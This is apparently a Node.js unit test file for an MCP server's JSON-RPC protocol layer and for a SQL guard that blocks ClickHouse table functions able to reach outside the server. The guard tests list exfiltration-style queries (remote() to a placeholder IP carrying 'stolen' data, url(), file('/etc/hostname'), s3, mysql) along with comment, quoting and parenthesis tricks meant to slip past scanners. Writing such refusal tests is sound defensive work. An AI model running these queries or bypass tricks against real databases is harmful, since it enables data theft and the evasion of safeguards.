#!/usr/bin/env node
// Unit gate for the MCP protocol layer (memhouse/mcp/rpc.js) — the shapes a client
// keys on, with no ClickHouse, no transport, and no network in scope. The live
// end-to-end pass over a real house is misc/mcp-test.js; THIS file is what `npm
// test` runs, so it must hold the line on:
//   * modern results carry resultType + serverInfo, tools/list carries
//     CacheableResult (ttlMs, cacheScope) and a DETERMINISTIC order
//   * the era split: initialize selects legacy shapes, per-request _meta selects
//     modern ones, and a wrong version is -32022 with the supported list
//   * a missing house refuses per-call as an isError TOOL RESULT — never a
//     protocol error, never a dead process

const assert = require('assert');

// The no-house behavior is only real if this runner's own environment cannot
// leak a house in. The pilot's shell exports MEMHOUSE_* on the machine this
// repo is developed on.
for (const k of ['MEMHOUSE_URL', 'MEMHOUSE_USER', 'MEMHOUSE_PASSWORD', 'MEMHOUSE_DB']) delete process.env[k];

const { handle, newState, MODERN, SERVER_INFO } = require('../memhouse/mcp/rpc');
const META = 'io.modelcontextprotocol/';

let passed = 0;
const tests = [];
function test(name, fn) { tests.push([name, fn]); }

const req = (method, params, id = 1) => ({ jsonrpc: '2.0', id, method, params });
const modernMeta = { [`${META}protocolVersion`]: MODERN, [`${META}clientCapabilities`]: {} };

// ── modern era ──────────────────────────────────────────────────────────────────
test('server/discover: the mandatory RPC, with identity, instructions, and cache hints', async () => {
  const r = await handle(req('server/discover', { _meta: modernMeta }), newState());
  assert.strictEqual(r.result.resultType, 'complete');
  assert.deepStrictEqual(r.result.supportedVersions, [MODERN]);
  assert.ok(r.result.capabilities.tools);
  assert.ok(r.result.instructions.includes('search'));
  assert.ok(r.result.ttlMs > 0);
  assert.strictEqual(r.result.cacheScope, 'private');
  assert.deepStrictEqual(r.result._meta[`${META}serverInfo`], SERVER_INFO);
});

test('tools/list (modern): seven tools, CacheableResult, and an order that never moves', async () => {
  const a = await handle(req('tools/list', { _meta: modernMeta }), newState());
  const b = await handle(req('tools/list', { _meta: modernMeta }), newState());
  const names = a.result.tools.map((t) => t.name);
  assert.deepStrictEqual(names, ['search', 'sessions', 'get_session', 'status', 'users', 'resume_command', 'sql']);
  // Determinism is a spec SHOULD and a prompt-cache guarantee: byte-identical.
  assert.strictEqual(JSON.stringify(a.result.tools), JSON.stringify(b.result.tools));
  assert.strictEqual(a.result.resultType, 'complete');
  assert.ok(a.result.ttlMs > 0);
  assert.strictEqual(a.result.cacheScope, 'private');
  for (const t of a.result.tools) {
    assert.ok(t.description.length > 40, `${t.name} has a real description`);
    assert.strictEqual(t.inputSchema.type, 'object');
  }
});

test('a wrong protocol version is -32022 with the supported list — the whole negotiation', async () => {
  const r = await handle(req('tools/list', { _meta: { [`${META}protocolVersion`]: '1900-01-01' } }), newState());
  assert.strictEqual(r.error.code, -32022);
  assert.deepStrictEqual(r.error.data.supported, [MODERN]);
  assert.strictEqual(r.error.data.requested, '1900-01-01');
});

// ── legacy era (dual-era server: initialize scopes legacy semantics) ────────────
test('initialize answers with the legacy shape and scopes the era to the process', async () => {
  const state = newState();
  const init = await handle(req('initialize', { protocolVersion: '2025-06-18', capabilities: {} }), state);
  assert.strictEqual(init.result.protocolVersion, '2025-06-18');
  assert.deepStrictEqual(init.result.serverInfo, SERVER_INFO);
  assert.ok(init.result.capabilities.tools);
  assert.strictEqual(init.result.resultType, undefined, 'legacy result carries no modern fields');
  // The follow-up list, version-less as legacy clients send it, gets legacy shape.
  const list = await handle(req('tools/list', {}), state);
  assert.strictEqual(list.result.tools.length, 7);
  assert.strictEqual(list.result.resultType, undefined);
  assert.strictEqual(list.result.ttlMs, undefined);
  // notifications/initialized is accepted silently.
  assert.strictEqual(await handle({ jsonrpc: '2.0', method: 'notifications/initialized' }, state), null);
  // ping is legacy liveness and still answers.
  const ping = await handle(req('ping', {}), state);
  assert.deepStrictEqual(ping.result, {});
});

test('a modern request is served modern even after initialize — per-request _meta wins', async () => {
  const state = newState();
  await handle(req('initialize', { protocolVersion: '2025-06-18' }), state);
  const r = await handle(req('tools/list', { _meta: modernMeta }), state);
  assert.strictEqual(r.result.resultType, 'complete');
});

// ── errors and edges ────────────────────────────────────────────────────────────
test('unknown method is -32601; unknown tool is -32602; junk with an id is -32600', async () => {
  const s = newState();
  assert.strictEqual((await handle(req('resources/read', { _meta: modernMeta }), s)).error.code, -32601);
  assert.strictEqual((await handle(req('tools/call', { name: 'nope', _meta: modernMeta }), s)).error.code, -32602);
  assert.strictEqual((await handle({ id: 9, method: 'x' }, s)).error.code, -32600);
});

test('notifications get no reply, and a cancelled id is remembered', async () => {
  const s = newState();
  assert.strictEqual(await handle({ jsonrpc: '2.0', method: 'notifications/whatever' }, s), null);
  assert.strictEqual(await handle({ jsonrpc: '2.0', method: 'notifications/cancelled', params: { requestId: 7 } }, s), null);
  assert.ok(s.cancelled.has(7));
});

// ── protocol edges ──────────────────────────────────────────────────────────────
test('tools/call with no arguments object at all still reaches the tool', async () => {
  // A sloppy client may omit `arguments` entirely; the handler gets {} and the
  // tool's own validation (requireHouse first) answers — not a TypeError.
  const r = await handle(req('tools/call', { name: 'status', _meta: modernMeta }), newState());
  assert.ok(r.result, 'a result, not a crash');
  assert.strictEqual(r.result.isError, true); // no house in this runner
});

test('initialize twice: the second answer is as valid as the first (no handshake state to corrupt)', async () => {
  const s = newState();
  const a = await handle(req('initialize', { protocolVersion: '2025-06-18' }), s);
  const b = await handle(req('initialize', { protocolVersion: '2025-11-25' }), s);
  assert.strictEqual(a.result.protocolVersion, '2025-06-18');
  assert.strictEqual(b.result.protocolVersion, '2025-11-25');
});

test('a modern-era ping still answers — a dual-era server does not punish leftovers', async () => {
  const r = await handle(req('ping', { _meta: modernMeta }), newState());
  assert.deepStrictEqual(r.result, {});
});

test('id 0 is a real id, not a notification', async () => {
  // `id === undefined` is the notification test; a falsy-but-present id must
  // round-trip. A client using 0-based ids would otherwise never get answer #0.
  const r = await handle(req('tools/list', { _meta: modernMeta }, 0), newState());
  assert.strictEqual(r.id, 0);
  assert.strictEqual(r.result.tools.length, 7);
});

test('string ids round-trip untouched', async () => {
  const r = await handle(req('server/discover', { _meta: modernMeta }, 'discover-1'), newState());
  assert.strictEqual(r.id, 'discover-1');
});

test('a request with params missing entirely is still answered', async () => {
  const r = await handle({ jsonrpc: '2.0', id: 5, method: 'tools/list' }, newState());
  assert.strictEqual(r.result.tools.length, 7);
});

test('jsonrpc 1.0 / missing jsonrpc field is refused as Invalid Request', async () => {
  const s = newState();
  assert.strictEqual((await handle({ jsonrpc: '1.0', id: 1, method: 'tools/list' }, s)).error.code, -32600);
  assert.strictEqual((await handle({ id: 2, method: 'tools/list' }, s)).error.code, -32600);
  // Junk with no id cannot be answered at all — null, not a throw.
  assert.strictEqual(await handle({ jsonrpc: '1.0', method: 'x' }, s), null);
  assert.strictEqual(await handle(null, s), null);
});

test('the version gate runs BEFORE method dispatch — even server/discover refuses a wrong version', async () => {
  // discover is the version-negotiation RPC, but a request that names a version
  // we do not speak gets -32022 with the supported list, per the spec's
  // per-request model; the client retries with one of ours.
  const r = await handle(req('server/discover', { _meta: { [`${META}protocolVersion`]: '2030-01-01' } }), newState());
  assert.strictEqual(r.error.code, -32022);
});

test('no house: every tool refuses as an isError RESULT that names the fix — never a protocol error', async () => {
  const s = newState();
  for (const name of ['search', 'get_session', 'sql']) {
    const r = await handle(req('tools/call', {
      name, arguments: name === 'sql' ? { query: 'SELECT 1' } : { q: 'x', session_id: 'x' }, _meta: modernMeta,
    }, 3), s);
    assert.ok(r.result, `${name}: a result, not error`);
    assert.strictEqual(r.result.isError, true);
    const text = r.result.content[0].text;
    assert.ok(text.includes('no house configured'), `${name} names the condition`);
    assert.ok(text.includes('memhouse install') || text.includes('MEMHOUSE_URL'), `${name} names the fix`);
    assert.ok(!text.includes('localhost:8123 as memhouse_root'), `${name} does not read like a CLI dump`);
  }
  // And discovery still worked the whole time — the client can SHOW the tools.
  const list = await handle(req('tools/list', { _meta: modernMeta }), s);
  assert.strictEqual(list.result.tools.length, 7);
});

// ── the dial-out guard (memhouse/server/sql-guard.js) ───────────────────────────
//
// Shared with the dashboard's /api/query, and until now never unit-tested on either
// surface — the four bypasses in its comments were all found by hand. They are the
// corpus below. What must hold: nothing that leaves this server gets through, and
// ordinary read SQL — including a housemate's shared database, which the MCP tool is
// SUPPOSED to reach — is not refused.

const sqlGuard = require('../memhouse/server/sql-guard');
const refuses = (sql) => sqlGuard.disallowedTableFunction(sql);

test('the guard refuses every way out of this server, including the four disguises', () => {
  const out = [
    ["SELECT * FROM remote('192.0.2.7:9000', 'system', 'one', 'u', 'p')", 'remote'],
    ["SELECT * FROM remoteSecure('h:9440', 'system', 'one')", 'remoteSecure'],
    ["SELECT * FROM cluster('c', 'system', 'one')", 'cluster'],
    ["SELECT * FROM clusterAllReplicas('c', 'system', 'one')", 'clusterAllReplicas'],
    ["SELECT * FROM url('http://example.invalid/x', 'LineAsString')", 'url'],
    ["SELECT * FROM file('/etc/hostname', 'LineAsString')", 'file'],
    ["SELECT * FROM s3('https://b.s3.amazonaws.com/k', 'CSV')", 's3'],
    ["SELECT * FROM mysql('h:3306', 'db', 't', 'u', 'p')", 'mysql'],
    // view() and merge() take a table expression or a database name as an ARGUMENT —
    // allowing them re-opens everything the allowlist is for.
    ['SELECT * FROM view(SELECT count() FROM system.tables)', 'view'],
    ["SELECT * FROM merge('other_db', '^messages')", 'merge'],
    // The four disguises, each of which desyncs a scanner that does not model the
    // construct the marker appears in.
    ["SELECT * FROM /* ' */ remote('h:9000', 'system', 'one')", 'remote'],          // quote in a comment
    ["SELECT '--' AS a, * FROM remote('h:9000', 'system', 'one')", 'remote'],       // comment marker in a string
    ["SELECT $d$'$d$ AS x, * FROM remote('h:9000', 'system', 'one')", 'remote'],    // quote in a heredoc
    ["SELECT * FROM # '\n remote('h:9000', 'system', 'one') --'", 'remote'],        // quote in a # comment
    ['SELECT * FROM "remote"(\'h:9000\', \'system\', \'one\')', 'remote'],           // quoted identifier
    // Table position is not only after FROM.
    ["SELECT * FROM messages JOIN sessions ON 1=1, remote('h:9000', 'system', 'one')", 'remote'],
    ['SELECT * FROM numbers(1) AS "WHERE", remote(\'h:9000\', \'system\', \'one\')', 'remote'],
    ["SELECT * FROM numbers(1) WHERE 1 IN (SELECT * FROM remote('h:9000', 'system', 'one'))", 'remote'],
    ["DESCRIBE url('http://example.invalid/x')", 'url'],                            // inference dials out
    // Wrapped in parentheses, the token before the name is '(' and not FROM. Today's
    // ClickHouse rejects these itself with a syntax error; the guard does not rely on
    // that staying true, so a paren opened by FROM / JOIN / a table comma counts, and
    // nesting inherits it.
    ["SELECT * FROM (remote('h:9000', 'system', 'one'))", 'remote'],
    ["SELECT * FROM ((remote('h:9000', 'system', 'one')))", 'remote'],
    ["SELECT * FROM numbers(1), (remote('h:9000', 'system', 'one'))", 'remote'],
    ["SELECT * FROM numbers(1) JOIN (remote('h:9000', 'system', 'one')) AS t ON 1 = 1", 'remote'],
  ];
  for (const [sql, fn] of out) {
    assert.strictEqual(refuses(sql), fn, `must refuse ${fn}(): ${sql}`);
  }
});

test('the guard lets ordinary read SQL — and a housemate\'s shared house — through', () => {
  const fine = [
    'SELECT 1',
    'SELECT count() FROM messages',
    'SELECT * FROM numbers(10)',
    "SELECT * FROM values('x UInt8', 1, 2)",
    'SELECT * FROM format(JSONEachRow, \'{"a":1}\')',
    // The shape of memhouse's own session rollup: calls in a derived table, and a
    // comma inside a SELECT list, neither of which is a table expression.
    'SELECT any(title), count() FROM (SELECT session_id, title, count() AS c FROM messages GROUP BY session_id, title)',
    "SELECT * FROM messages ARRAY JOIN splitByChar(',', content) AS part",
    'SELECT a.session_id FROM messages AS a JOIN sessions AS b ON a.session_id = b.session_id',
    // Cross-house reads are a FEATURE of this tool (a shared house, named). The
    // dashboard confines reads to its own database; the MCP tool must not.
    'SELECT count() FROM yigit.messages',
    'SELECT count() FROM system.tables',
    // A dial-out name that is not in table position is not a table function.
    "SELECT url FROM messages WHERE content LIKE '%remote(%'",
    // Parens opened by something that is NOT a table introducer still hold calls that
    // are ordinary expressions — this is what the wrapper rule must not break.
    'SELECT * FROM messages AS a JOIN sessions AS b ON (toDate(a.ts) = toDate(b.ts))',
    "SELECT count() FROM messages WHERE session_id IN (SELECT session_id FROM sessions WHERE lower(name) LIKE '%x%')",
    'SELECT * FROM (SELECT session_id, count() AS c FROM messages GROUP BY session_id) WHERE c > 1',
    'SELECT toDate(ts) AS d, count() FROM messages GROUP BY (toDate(ts)) ORDER BY d',
  ];
  for (const sql of fine) {
    assert.strictEqual(refuses(sql), null, `must allow: ${sql}`);
  }
});

test('the sql tool refuses a dial-out as an isError tool result, naming the function and the fix', async () => {
  const s = newState();
  const r = await handle(req('tools/call', {
    name: 'sql',
    arguments: { query: "SELECT * FROM remote('192.0.2.7:9000', 'system', 'one', 'u', (SELECT 'stolen'))" },
    _meta: modernMeta,
  }, 9), s);
  assert.ok(r.result.isError, 'refused as a tool result, not a protocol error');
  const text = r.result.content[0].text;
  assert.ok(text.includes('remote()'), 'names the function');
  assert.ok(text.includes('does not reach out of it'), 'says why');
  assert.ok(/sessions, messages, tool_calls/.test(text), 'names what to query instead');
  // The refusal must land BEFORE the no-house check would: this runner has no house,
  // and a guard that ran second would answer "no house configured" and hide the reason
  // on any configured install.
  assert.ok(!text.includes('no house configured'), 'the dial-out reason is what the caller sees');
});

(async () => {
  for (const [name, fn] of tests) {
    try { await fn(); passed++; } catch (e) {
      console.error(`FAIL  ${name}\n      ${e.message}`);
      process.exitCode = 1;
    }
  }
  if (process.exitCode) console.error(`\n${passed} passed, some failed`);
  else console.log(`${passed}/${tests.length} mcp unit checks pass`);
})();
